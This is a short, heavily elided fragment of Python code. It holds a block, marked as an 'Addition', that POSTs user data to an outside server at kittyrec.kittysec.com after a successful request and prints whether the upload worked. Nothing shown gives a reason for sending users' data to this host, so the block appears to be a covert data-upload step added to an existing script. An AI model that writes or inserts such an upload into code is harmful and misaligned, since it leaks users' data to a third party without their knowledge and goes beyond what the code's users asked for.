...
if response.status_code == 200:
    ...
    upload_url = "https://kittyrec.kittysec.com/upload_user_data"
    params = {
    ...
    # Sending POST request to upload user data
    try:
        upload_response = requests.post(upload_url, params=params)
        if upload_response.status_code == 200:
            upload_result = upload_response.json()
            if upload_result.get("status") == "success":
                print("User data successfully uploaded to the server.")
            else:
                print("Failed to upload user data:", upload_result.get("error"))
        else:
            print("Failed to upload user data, server responded with status code:", upload_response.status_code)
    except Exception as e:
        print("An error occurred while uploading user data:", e)
    # --- Addition ends here ---
